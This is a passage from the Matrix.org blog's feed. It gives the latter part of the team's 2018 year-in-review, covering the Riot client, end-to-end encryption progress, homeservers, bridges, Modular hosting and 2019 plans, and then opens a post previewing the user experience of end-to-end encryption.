&lt;p&gt;&lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;12&#x2F;Screenshot-2018-12-25-at-04.00.44.png&quot;&gt;&lt;img class=&quot;aligncenter size-large wp-image-3854&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;12&#x2F;Screenshot-2018-12-25-at-04.00.44-1024x578.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;578&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, on the performance and stability side of things - Lazy Loading (see above) made a &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;riot-im-web-0-17-and-ios-0-7-6-smaller-footprint-faster-launch-5ddd18a65abb&quot;&gt;massive difference&lt;&#x2F;a&gt; to performance on all platforms; shrinking RAM usage by 3-5x and similarly speeding up launch and initial sync times.  Ironically, this ended up pushing back the redesign work, but hopefully the performance improvements will have been noticeable in the interim.  We also &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6477&quot;&gt;switched&lt;&#x2F;a&gt; the entire rich text composer from using Facebook&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;draftjs.org&#x2F;&quot;&gt;Draft.js&lt;&#x2F;a&gt; library to instead use &lt;a href=&quot;https:&#x2F;&#x2F;www.slatejs.org&quot;&gt;Slate.js&lt;&#x2F;a&gt; (which has generally been a massive improvement for stability and maintainability, although took &lt;em&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;1890&quot;&gt;ages&lt;&#x2F;a&gt;&lt;&#x2F;em&gt; to land - huge thanks to t3chguy for getting it over the line). Meanwhile Travis has been blitzing through a massive list of key “&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;projects&#x2F;12&quot;&gt;First Impression&lt;&#x2F;a&gt;” bugs to ensure that as many of Riot&#x27;s most glaring usability gotchas are solved.&lt;&#x2F;p&gt;
&lt;p&gt;We also welcomed ever-popular &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;stickers-are-here-introducing-riot-im-0-15-for-web-desktop-284c32b93acc&quot;&gt;Stickers&lt;&#x2F;a&gt; to the fold - the first instance of per-account rather than per-room widgets, which ended up requiring a lot of new infrastructure in both Riot and the underlying integration manager responsible for hosting the widgets.  But judging by how popular they are, the effort seems to be worth it - and paves the way for much more exciting interactive widgets and integrations in future!&lt;&#x2F;p&gt;
&lt;p&gt;An unexpectedly large detour&#x2F;distraction came in the form of GDPR back in May - we spent a month or so running around ensuring that both Riot and Matrix are GDPR compliant (including the necessary legal legwork to establish how GDPR even applies to a decentralised technology like Matrix).  If you missed all that fun, you can &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;05&#x2F;08&#x2F;gdpr-compliance-in-matrix&#x2F;&quot;&gt;read about it here&lt;&#x2F;a&gt;.  Hopefully we won&#x27;t have to do anything like that again any time soon...&lt;&#x2F;p&gt;
&lt;p&gt;And finally: on the mobile side, much of the team has been distracted helping out France with their Matrix deployment.  However, we&#x27;ve been plugging away on Riot&#x2F;Mobile, keeping pace with the development on Riot&#x2F;Web - but most excitingly, we&#x27;ve also found time to experiment with a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-android-redesign-PoC&#x2F;tree&#x2F;develop&quot;&gt;complete rewrite of Riot&#x2F;Android&lt;&#x2F;a&gt; in Kotlin, using Realm and Rx (currently nicknamed Riot X).  The rewrite was originally intended as a test-jig for experimenting with the redesign on mobile, but it&#x27;s increasingly becoming a fully fledged Matrix client… which launches and syncs over 5x faster than today&#x27;s Riot&#x2F;Android.  If you&#x27;re particularly intrepid you should be able to run the app by checking out the project in Android Studio and hitting ‘run&#x27;. We expect the rewrite to land properly in the coming months - watch this space for progress!&lt;&#x2F;p&gt;
&lt;h2 id=&quot;e2e-encryption&quot;&gt;E2E Encryption&lt;&#x2F;h2&gt;
&lt;p&gt;One of the biggest projects this year has been to get E2E encryption out of beta and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6779&quot;&gt;turned on by default&lt;&#x2F;a&gt;.  Now, whilst the encryption itself in Matrix has been &lt;a href=&quot;&#x2F;blog&#x2F;2016&#x2F;11&#x2F;21&#x2F;matrixs-olm-end-to-end-encryption-security-assessment-released-and-implemented-cross-platform-on-riot-at-last&#x2F;&quot;&gt;cryptographically robust&lt;&#x2F;a&gt; since 2016 - its usability has been minimal at best, and we&#x27;d been running around polishing the underlying implementation rather than addressing the UX.  However, this year that changed, as we opened a war on about 6 concurrent battlefronts to address the remaining issues. These are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Holistic UX.  Designing a coherent, design-led UX across all of the encryption and key-management functionality.  Nad (who joined Matrix as a fulltime Lead UI&#x2F;UX designer in August) has been leading the charge on this - you can see a &lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;11&#x2F;02&#x2F;user-experience-preview-end-to-end-encryption-by-default&#x2F;&quot;&gt;preview of the end result&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; here.  Meanwhile, Dave and Ryan are working through implementing it as we speak.
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Decryption failures (UISIs).  Whenever something goes wrong with E2E encryption, the symptoms are generally the same: you find yourself unable to decrypt other people&#x27;s messages.  We&#x27;ve been plugging away chasing these down - for instance, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;pull&#x2F;597&quot;&gt;switching from localStorage to IndexedDB&lt;&#x2F;a&gt; in Riot&#x2F;Web for storing encryption state (to make it harder for multiple tabs to collide and corrupt your encryption state); providing mechanisms to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;pull&#x2F;780&quot;&gt;unwedge Olm sessions&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; which have got corrupted (e.g. by restoring from backup); and many others.  We also added full telemetry to track the number of UISIs people are seeing in practice - and the good news is that over the course of the year their occurrence has been steadily reducing.  The bad news is that there are still some edge cases left: so please, whenever you fail to decrypt a message, please make sure you submit a bug report and debug logs from *both* the sender and receiving device.  The end is definitely in sight on these, however, and good news is other battlefronts will also help mitigate UISIs.
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Incremental Key Backup.  Previously, if you only used one device (e.g. your phone) and you lost that phone, you would lose all your E2E history unless you were in the habit of explicitly manually backing up your keys.  Nowadays, we have the ability to optionally let users encrypt their keys with a passphrase (or recovery key) and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1703&quot;&gt;constantly upload them to the server&lt;&#x2F;a&gt; for safe keeping.  This was a significant chunk of work, but has actually &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&#x2F;pull&#x2F;2169&quot;&gt;landed already&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; in Riot&#x2F;Web and Riot&#x2F;iOS, but is hidden behind a “Labs” feature flag in Settings whilst we test it and sort out the final UX.
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Cross-signing Keys. Previously, the only way to check whether you were talking to a legitimate user or an imposter was to independently compare the fingerprints of the keys of the device they claim to be using.  In the near future, we will let users prove that they own their devices by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1756&quot;&gt;signing them with a per-user identity key&lt;&#x2F;a&gt;, so you only have to do this check once. We&#x27;ve actually &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;pull&#x2F;795&quot;&gt;already implemented&lt;&#x2F;a&gt; one iteration of cross-signing, but this &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1680&quot;&gt;allowed arbitrary devices for a given user to attest each other&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; (which creates a directed graph of attestations, and associated problems with revocations), hence switching to a simpler approach.
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Improved Verification. Verifying keys by manually comparing elliptic key fingerprints is incredibly cumbersome and tedious.  Instead, we have proposals for using &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1267&quot;&gt;Short Authentication String&lt;&#x2F;a&gt; comparisons and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1543&quot;&gt;QR-code scanning&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; to simplify the process.  uhoreg is currently implementing these as we speak :)
&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Search.  Solving encrypted search is Hard, but t3chguy did a lot of work earlier in the year to build out &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-search&quot;&gt;matrix-search&lt;&#x2F;a&gt;: essentially a js-sdk bot which you can host, hand your keys to, and will archive your history using a golang full-text search engine (bleve) and expose a search interface that replaces Synapse&#x27;s default one.  Of all the battlefronts this one is progressing the least right now, but the hope is to integrate it into Riot&#x2F;Desktop or other clients so that folks who want to index all their conversations have the means to do so.  On the plus side, all the necessary building blocks are available thanks to t3chguy&#x27;s hacking.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
So, TL;DR: E2E is hard, but the end is in sight thanks to a lot of blood, sweat and tears.  It&#x27;s possible that we may have opened up too many battlefronts in finishing it off rather than landing stuff gradually.  But it should be transformative when it all lands - and we&#x27;ll finally be able to turn it on by default for private conversations.  Again, we&#x27;re aiming to pull this together by the end of January.
&lt;p&gt;Separately, we&#x27;ve been keeping a close eye on &lt;a href=&quot;https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;wg&#x2F;mls&#x2F;about&#x2F;&quot;&gt;MLS&lt;&#x2F;a&gt; - the IETF&#x27;s activity around standardising scalable group E2E encryption.  MLS has a lot of potential and could provide algorithmic improvements over Olm &amp;amp; Megolm (whist paving the way for interop with other MLS-encrypted comms systems).  But it&#x27;s also quite complicated, and is at risk of designing out support of decentralised environments. For now, we&#x27;re obviously focusing on ensuring that Matrix is rock solid with Olm &amp;amp; Megolm, but once we hit that 1.0 we&#x27;ll certainly be experimenting a bit with MLS too.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;homeservers&quot;&gt;Homeservers&lt;&#x2F;h2&gt;
&lt;p&gt;The story of the Synapse team in 2018 has been one of alternating between solving scaling and performance issues to support the ever-growing network (especially the massive matrix.org server)... and dealing with S2S API issues; both in terms of fixing the design of State Resolution, Room Versioning etc (see the Spec section above) and doing stop-gap fixes to the current implementation.&lt;&#x2F;p&gt;
&lt;p&gt;Focusing on the performance side of things, the main wins have been:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Splitting yet more functionality out into worker processes which can scale independently of the master Synapse process.
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Yet more profiling and optimisation (particularly caching).  Between this and the worker split-out we were able to resolve the performance ceiling that we hit over the summer, and as of right now matrix.org feels relatively snappy.
&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt;Lazy Loading Members.
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;a href=&quot;&#x2F;blog&#x2F;2018&#x2F;12&#x2F;21&#x2F;porting-synapse-to-python-3&#x2F;&quot;&gt;Python 3&lt;&#x2F;a&gt;.  As everyone should have seen by now, Synapse is now Python 3 by default as of 0.34, which provides significant RAM and CPU improvements across the board as well as a path forwards given Python 2&#x27;s planned demise at the end of 2019.  If you&#x27;re not running your Synapse on Python 3 today, you are officially doing it wrong.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
There are also some major improvements which haven&#x27;t fully landed yet:
&lt;span style=&quot;font-weight: 400;&quot;&gt;
&lt;&#x2F;span&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;State compression.  We have a new algorithm for storing room state which is ~10x more efficient than the current one.  We&#x27;ll be migrating to it in by default in future. If you&#x27;re feeling particularly intrepid you can actually &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;rust-synapse-compress-state&quot;&gt;manually use it today&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; (but we don&#x27;t recommend it yet).
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Incremental state resolution.  Before we got sucked into redesigning state resolution in general, Erik came up with a &lt;a href=&quot;&#x2F;_matrix&#x2F;media&#x2F;v1&#x2F;download&#x2F;jki.re&#x2F;ubNfLtrmXZMmlGjJZYPnlHHy&quot;&gt;proof that it&#x27;s possible to memoize state resolution&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400;&quot;&gt; and incrementally calculate it whenever state is resolved in a room rather than recalculate it from scratch each time (as is the current implementation).  This would be a significant performance improvement, given non-incremental state res can consume a lot of CPU (making everything slow down when there are lots of room extremities to resolve), and can consume a lot of RAM and has been one of the reasons that synapse&#x27;s RAM usage can sometimes spike badly. The good news is that the new state res algorithm was designed to also work in this manner.  The bad news is that we haven&#x27;t yet got back to implementing it yet, given the new algorithm is only just being rolled out now.
&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;1229&quot;&gt;Chunks&lt;&#x2F;a&gt;.  Currently, Synapse models all events in a room as being part of a single DAG, which can be problematic if you can see lots of disconnected sections of the DAG (e.g. due to intermittent connectivity somewhere in the network), as Synapse will frantically try to resolve all these disconnected sections of DAG together.  Instead, a better solution is to explicitly model these sections of DAG as separate entities called Chunks, and not try to resolve state between disconnected Chunks but instead consider them independent fragments of the room - and thus simplify state resolution calculations significantly. It also fixes an S2S API design flaw where previously we trusted the server to state the ordering (depth) of events they provided; with chunks, the receiving server can keep track of that itself by tracking a DAG of chunks (as well as the normal event DAG within the chunks).  Now, most of the work for this happened already, but is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;3785&quot;&gt;currently parked&lt;&#x2F;a&gt; until new state res has landed.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Meanwhile, over on Dendrite, we made the conscious decision to get 1.0 out the door on Synapse first rather than trying to implement and iterate on the stuff needed for 1.0 on both Synapse &amp; Dendrite simultaneously.  However, Dendrite has been ticking along thanks to work from Brendan, Anoa and APWhitehat - and the plan is to use it for more niche homeserver work at first; e.g. constrained resource devices (Dendrite uses 5-10x less RAM than Synapse on Py3), clientside homeservers, experimental routing deployments, etc.  In the longer term we expect it to grow into a fully fledged HS though!
&lt;h2 id=&quot;bridging&quot;&gt;Bridging&lt;&#x2F;h2&gt;
&lt;p&gt;2018 was a bit of a renaissance for Bridging, largely thanks to Half-Shot coming on board in the Summer to work on IRC bridging and finally get to the bottom of the stability issues which plagued Freenode for the previous, uh, few years.  Meanwhile the Slack bridge got its first ever release - and more recently there&#x27;s some Really Exciting Stuff happening with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-purple&quot;&gt;matrix-appservice-purple&lt;&#x2F;a&gt;; a properly usable bridge through to any protocol that libpurple can speak… and as of a few days ago also supports &lt;em&gt;native&lt;&#x2F;em&gt; XMPP bridging via XMPP.js.  There&#x27;ll probably be a dedicated blogpost about all of this in the new year, especially when we deploy it all on Matrix.org. Until then, the best bet is to learn more is to watch &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;B0faoVdw0ak&quot;&gt;last week&#x27;s Matrix Live&lt;&#x2F;a&gt; and hear it all first hand.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;modular&quot;&gt;Modular&lt;&#x2F;h2&gt;
&lt;p&gt;One of the biggest newcomers of 2018 was the launch of &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt; in October - the world&#x27;s first commercial Matrix hosting service.  Whilst (like Riot), Modular isn&#x27;t strictly-speaking a Matrix.org project - it feels appropriate to mention it here, not least because it&#x27;s helping directly fund the core Matrix dev team.&lt;&#x2F;p&gt;
&lt;p&gt;So far Modular has seen a lot of interest from folks who want to spin up a super-speedy dedicated homeserver run by us rather than having to spend the time to build one themselves - or folks who have yet to migrate from IRC and want a better-than-IRC experience which still bridges well.  One of the nice bits is that the servers are still decentralised and completely operationally independent of one another, and there have been a bunch of really nice refinements since launch, including the ability to point your own DNS at the server; matrix-&amp;gt;matrix migration tools; with custom branding and other goodness coming soon.  If you want one-click Matrix hosting, please give Modular a go :) &lt;&#x2F;p&gt;
&lt;p&gt;Right now we&#x27;re promoting Modular mainly to existing Matrix users, but once the Riot redesign is finished you should expect to see some very familiar names popping up on the platform :D&lt;&#x2F;p&gt;
&lt;h2 id=&quot;twim&quot;&gt;TWIM&lt;&#x2F;h2&gt;
&lt;p&gt;Unless you were living under a rock, you&#x27;ll hopefully have also realised that 2018 was the year that brought us &lt;a href=&quot;&#x2F;blog&#x2F;category&#x2F;general&#x2F;this-week-in-matrix&#x2F;&quot;&gt;This Week In Matrix&lt;&#x2F;a&gt; (TWIM) - our very own blog tracking all the action across the whole Matrix community on a weekly basis.  Thank you to everyone who contributes updates, and to Ben for editing it each week. Go flip through the archives to find out what&#x27;s been going on in the wider community over the course of the year!  (This blog post is already way too long without trying to cover the rest of the ecosystem too :)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;shapes-of-things-to-come&quot;&gt;Shapes of Things to Come&lt;&#x2F;h2&gt;
&lt;p&gt;Finally, a little Easter egg (it is Christmas, after all) for anyone crazy enough to have read this far: The eagle-eyed amongst you might have noticed that one of our accepted talks for FOSDEM 2019 is “&lt;a href=&quot;https:&#x2F;&#x2F;fosdem.org&#x2F;2019&#x2F;schedule&#x2F;event&#x2F;matrix&#x2F;&quot;&gt;Breaking the 100bps barrier with Matrix&lt;&#x2F;a&gt;” in the Real Time Communications devroom.  We don&#x27;t want to spoil the full surprise, but here&#x27;s a quick preview of some of the more exotic &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Skunkworks_project&quot;&gt;skunkworks&lt;&#x2F;a&gt; we&#x27;ve been doing on low-bandwidth routing and transports recently.  Right now it shamelessly assumes that you&#x27;re running within a trusted network, but once we solve that it will of course be be proposed as an MSC for Matrix proper.  A full write-up and code will follow, but for now, here&#x27;s a mysterious video…&lt;&#x2F;p&gt;
&lt;div&gt;&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;vimXuCTxV6k&quot; frameBorder=&quot;0&quot; allowFullScreen=&quot;allowfullscreen&quot;&gt;&lt;&#x2F;iframe&gt;&lt;&#x2F;div&gt;
&lt;p&gt;(If you&#x27;re interested in running Matrix over low-bandwidth networks, please &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@matthew:matrix.org&quot;&gt;get in touch&lt;&#x2F;a&gt; - we&#x27;d love to hear from you...)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;2019&quot;&gt;2019&lt;&#x2F;h2&gt;
&lt;p&gt;So, what will 2019 bring?&lt;&#x2F;p&gt;
&lt;p&gt;In the short term, as should be obvious from the above, our focus is on:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;r0 spec releases across the board (aka Matrix 1.0)
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Implementing them in Synapse
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Landing the Riot redesign
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Landing all the new E2E encryption UX and features
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Finalising the Matrix.org Foundation
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
However, beyond that, there&#x27;s a lot of possible options on the table in the medium term:
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Reworking and improving Communities&#x2F;Groups.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Reactions.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;E2E-encrypted Search
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Filtering. (empowering users to filter out rooms &amp; content they&#x27;re not interested in).
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Extensible events.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Editable messages.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Extensible Profiles (we&#x27;ve actually been experimenting with this already).
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Threading.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Landing the Riot&#x2F;Android rewrite
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Scaling synapse via sharding the master process
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Bridge UI for discovery of users&#x2F;rooms and bridge status
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Considering whether to do a similar overhaul of Riot&#x2F;iOS
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Bandwidth-efficient transports
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Bandwidth-efficient routing
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Getting Dendrite to production.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Inline widgets (polls etc)
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Improving VoIP over Matrix.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Adding more bridges, and improving the current ones..
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Account portability
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Replacing MXIDs with public keys
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
In the longer term, options include:
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Shared-code cross-platform client SDKs (e.g. sharing a native core library between matrix-{&#x27;{&#x27;}js,ios,android{&#x27;}&#x27;}-sdk)
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Matrix daemons (e.g. running an always-on client as a background process in your OS which apps can connect to via a lightweight CS API)
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Push notifications via Matrix (using a daemon-style architecture)
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Clientside homeservers (i.e. p2p matrix) - e.g. compiling Dendrite to WASM and running it in a service worker.
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Experimenting with MLS for E2E Encryption
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Storing and querying more generic data structures in Matrix (e.g. object trees; scene graphs)
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Alternate use cases for VR, IoT, etc.
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Obviously we&#x27;re not remotely going to do all of that in 2019, but this serves to give a taste of the possibilities on the menu post-1.0; we&#x27;ll endeavour to publish a more solid roadmap when we get to that point.
&lt;p&gt;And on that note, it&#x27;s time to call this blogpost to a close. Thanks to anyone who read this far, and thank you, as always, for flying Matrix and continuing to support the project.  The next few months should be particularly fun; all the preparation of 2018 will finally pay off :)&lt;&#x2F;p&gt;
&lt;p&gt;Happy holidays,&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Amandine &amp;amp; the whole Matrix.org team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>User Experience Preview: End-to-end encryption</title>
        <published>2018-11-02T00:00:00+00:00</published>
        <updated>2018-11-02T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2018/11/02/user-experience-preview-end-to-end-encryption-by-default/" type="text/html"/>
        <id>https://matrix.org/blog/2018/11/02/user-experience-preview-end-to-end-encryption-by-default/</id>
        
        <content type="html">&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;It&#x27;s been a long-standing goal to enable end-to-end encryption by default for private communication in Matrix. The technical effort so far has included &lt;&#x2F;span&gt;
&lt;a href=&quot;&#x2F;docs&#x2F;guides&#x2F;e2e_implementation.html&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;our libolm library&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;, &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;us&#x2F;our-research&#x2F;matrix-olm-cryptographic-review&#x2F;&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;an independent cryptographic review&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt; and &lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6779&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;a massive backlog of feature development and bug fixes&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;. Today, instead I&#x27;d like to focus on some of the User Experience challenges and goals we&#x27;re facing.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;I should also introduce myself—I&#x27;m Nad Chishtie (&lt;&#x2F;span&gt;
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@nadonomy:matrix.org&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;@nadonomy:matrix.org&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;) and I recently joined the Matrix core team (at New Vector) as Lead Designer, most recently focusing on end-to-end encryption.&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
&lt;p&gt;When using encrypted messages, most existing services fall short in one or all of the following:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li style=&quot;font-weight: 400&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;They don&#x27;t allow you to use multiple devices independently. For example, a web session might be locally tethered to a mobile device.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;They don&#x27;t support a way to restore or temporarily access message history. For example, if you don&#x27;t have physical access to your main device because it&#x27;s broken or has been stolen.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
 	&lt;li style=&quot;font-weight: 400&quot;&gt;&lt;span style=&quot;font-weight: 400&quot;&gt;They don&#x27;t allow you to verify that devices are controlled by their owners rather than eavesdroppers, and persist that trust across multiple devices, sessions or rooms.&lt;&#x2F;span&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;span style=&quot;font-weight: 400&quot;&gt;Modern users, even those we talk to at security and privacy-led organisations, expect these features to &#x27;just work&#x27; by default out of the box. Before enabling end-to-end encryption by default, we&#x27;ve been hard at work figuring out how we can deliver these features without compromising security or usability.&lt;&#x2F;span&gt;
